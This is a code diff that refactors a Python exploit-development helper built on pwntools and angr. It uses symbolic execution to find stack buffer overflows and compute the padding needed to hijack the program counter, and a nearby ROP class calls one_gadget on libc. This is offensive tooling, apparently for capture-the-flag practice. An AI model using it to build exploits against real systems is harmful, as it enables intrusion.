@@ -209,33 +209,33 @@ class ROP:
           return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', self.libc]).decode().split(' ')]
 
 class Get2overflow:
-    def __init__(s, binary):
-        s.elf = context.binary =  ELF(binary)
-        s.proj = angr.Project(binary)
-        start_addr = self.sym["main"]
+    def __init__(self, binary):
+        self.elf = context.binary =  ELF(binary)
+        self.proj = angr.Project(binary)
+        start_addr = self.elf.sym["main"]
         # Maybe change to symbolic file stream
         buff_size = 1024
-        s.symbolic_input = claripy.BVS("input", 8 * buff_size)
-        s.symbolic_padding = None
+        self.symbolic_input = claripy.BVS("input", 8 * buff_size)
+        self.symbolic_padding = None
 
-        s.state = s.proj.factory.blank_state(
+        self.state = self.proj.factory.blank_state(
                 addr=start_addr,
-                stdin=s.symbolic_input
+                stdin=self.symbolic_input
         )
-        s.simgr = s.proj.factory.simgr(s.state, save_unconstrained=True)
-        s.simgr.stashes["mem_corrupt"] = []
+        self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
+        self.simgr.stashes["mem_corrupt"] = []
 
-        s.simgr.explore(step_func=s.check_mem_corruption)
+        self.simgr.explore(step_func=self.check_mem_corruption)
 
-    def check_mem_corruption(s, simgr):
+    def check_mem_corruption(self, simgr):
         if len(simgr.unconstrained) > 0:
             for path in simgr.unconstrained:
                 path.add_constraints(path.regs.pc == b"AAAAAAAA")
                 if path.satisfiable():
-                    stack_smash = path.solver.eval(s.symbolic_input, cast_to=bytes)
+                    stack_smash = path.solver.eval(self.symbolic_input, cast_to=bytes)
                     try:
                         index = stack_smash.index(b"AAAAAAAA")
-                        s.symbolic_padding = stack_smash[:index]
+                        self.symbolic_padding = stack_smash[:index]
                         simgr.stashes["mem_corrupt"].append(path)
                     except ValueError:
                         print("[-] Failed to get offset!")
@@ -245,6 +245,6 @@ class Get2overflow:
 
         return simgr
 
-    def buf(s):
-        return len(s.symbolic_padding)
+    def buf(self):
+        return len(self.symbolic_padding)
 
